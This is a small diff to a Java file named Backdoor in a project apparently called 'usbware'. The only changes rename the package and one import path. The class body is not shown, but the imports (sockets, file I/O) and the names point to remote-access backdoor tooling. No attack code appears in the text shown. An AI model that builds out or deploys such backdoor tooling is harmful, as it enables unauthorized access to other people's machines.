@@ -1,4 +1,4 @@
-package thatcherdev.usbware.backdoor;
+package com.github.thatcherdev.usbware.backdoor;
 
 import java.io.File;
 import java.io.FileNotFoundException;
@@ -6,7 +6,7 @@ import java.io.PrintWriter;
 import java.net.Socket;
 import java.util.Scanner;
 import javax.swing.JOptionPane;
-import thatcherdev.usbware.backend.Utils;
+import com.github.thatcherdev.usbware.backend.Utils;
 
 public class Backdoor {
 
